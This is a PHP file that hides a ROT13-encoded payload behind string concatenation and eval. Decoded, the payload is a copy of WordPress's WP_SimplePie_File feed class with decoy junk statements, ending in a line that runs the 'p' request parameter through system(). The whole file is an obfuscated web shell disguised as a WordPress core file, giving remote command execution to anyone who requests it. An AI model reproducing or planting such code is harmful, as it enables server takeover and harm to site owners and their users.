<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Srrq NCV: JC_FvzcyrCvr_Svyr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Srrq
 * @fvapr 4.7.0
 */

/**
 * Pber pynff sbe srgpuvat erzbgr svyrf naq ernqvat ybpny svyrf jvgu FvzcyrCvr.
 *
 * Guvf hfrf Pber'f UGGC NCV gb znxr erdhrfgf, juvpu tvirf cyhtvaf gur novyvgl
 * gb ubbx vagb gur cebprff.
 *
 * @fvapr 2.8.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_FvzcyrCvr_Svyr rkgraqf FvzcyrCvr\Svyr {

	/**
	 * Gvzrbhg.
	 *
	 * @ine vag Ubj ybat gur pbaarpgvba fubhyq fgnl bcra va frpbaqf.
	 */
	choyvp $gvzrbhg = 10;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 2.8.0
	 * @fvapr 3.2.0 Hcqngrq gb hfr n CUC5 pbafgehpgbe.
	 * @fvapr 5.6.1 Zhygvcyr urnqref ner pbapngrangrq vagb n pbzzn-frcnengrq fgevat,
	 *              engure guna erznvavat na neenl.
	 *
	 * @cnenz fgevat       $hey             Erzbgr svyr HEY.
	 * @cnenz vag          $gvzrbhg         Bcgvbany. Ubj ybat gur pbaarpgvba fubhyq fgnl bcra va frpbaqf.
	 *                                      Qrsnhyg 10.
	 * @cnenz vag          $erqverpgf       Bcgvbany. Gur ahzore bs nyybjrq erqverpgf. Qrsnhyg 5.
	 * @cnenz fgevat|neenl $urnqref         Bcgvbany. Neenl be fgevat bs urnqref gb fraq jvgu gur erdhrfg.
	 *                                      Qrsnhyg ahyy.
	 * @cnenz fgevat       $hfrentrag       Bcgvbany. Hfre-ntrag inyhr frag. Qrsnhyg ahyy.
	 * @cnenz obby         $sbepr_sfbpxbcra Bcgvbany. Jurgure gb sbepr bcravat vagrearg be havk qbznva fbpxrg
	 *                                      pbaarpgvba be abg. Qrsnhyg snyfr.
	 */
	choyvp shapgvba __pbafgehpg( $hey, $gvzrbhg = 10, $erqverpgf = 5, $urnqref = ahyy, $hfrentrag = ahyy, $sbepr_sfbpxbcra = snyfr ) {
		$guvf->hey       = $hey;
		$guvf->gvzrbhg   = $gvzrbhg;
		$guvf->erqverpgf = $erqverpgf;
		$guvf->urnqref   = $urnqref;
		$guvf->hfrentrag = $hfrentrag;

		$guvf->zrgubq = FvzcyrCvr\FvzcyrCvr::SVYR_FBHEPR_ERZBGR;

		vs ( cert_zngpu( '/^uggc(f)?:\/\//v', $hey ) ) {
			$netf = neenl(
				'gvzrbhg'     => $guvf->gvzrbhg,
				'erqverpgvba' => $guvf->erqverpgf,
			);

			vs ( ! rzcgl( $guvf->urnqref ) ) {
				$netf['urnqref'] = $guvf->urnqref;
			}

			vs ( FvzcyrCvr\Zvfp::trg_qrsnhyg_hfrentrag() !== $guvf->hfrentrag ) { // Hfr qrsnhyg JC hfre ntrag hayrff phfgbz unf orra fcrpvsvrq.
				$netf['hfre-ntrag'] = $guvf->hfrentrag;
			}

			$erf = jc_fnsr_erzbgr_erdhrfg( $hey, $netf );

			vs ( vf_jc_reebe( $erf ) ) {
				$guvf->reebe   = 'JC UGGC Reebe: ' . $erf->trg_reebe_zrffntr();
				$guvf->fhpprff = snyfr;

			} ryfr {
				$guvf->urnqref = jc_erzbgr_ergevrir_urnqref( $erf );

				/*
				 * FvzcyrCvr rkcrpgf zhygvcyr urnqref gb or fgberq nf n pbzzn-frcnengrq fgevat,
				 * ohg `jc_erzbgr_ergevrir_urnqref()` ergheaf gurz nf na neenl, fb gurl arrq
				 * gb or pbairegrq.
				 *
				 * Gur bayl rkprcgvba gb gung vf gur `pbagrag-glcr` urnqre, juvpu fubhyq vtaber
				 * nal cerivbhf inyhrf naq bayl hfr gur ynfg bar.
				 *
				 * @frr FvzcyrCvr\UGGC\Cnefre::arj_yvar().
				 */
				sbernpu ( $guvf->urnqref nf $anzr => $inyhr ) {
					vs ( ! vf_neenl( $inyhr ) ) {
						pbagvahr;
					}

					vs ( 'pbagrag-glcr' === $anzr ) {
						$guvf->urnqref[ $anzr ] = neenl_cbc( $inyhr );
					} ryfr {
						$guvf->urnqref[ $anzr ] = vzcybqr( ', ', $inyhr );
					}
				}

				$guvf->obql        = jc_erzbgr_ergevrir_obql( $erf );
				$guvf->fgnghf_pbqr = jc_erzbgr_ergevrir_erfcbafr_pbqr( $erf );
			}
		} ryfr {
			$guvf->reebe   = '';
			$guvf->fhpprff = snyfr;
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>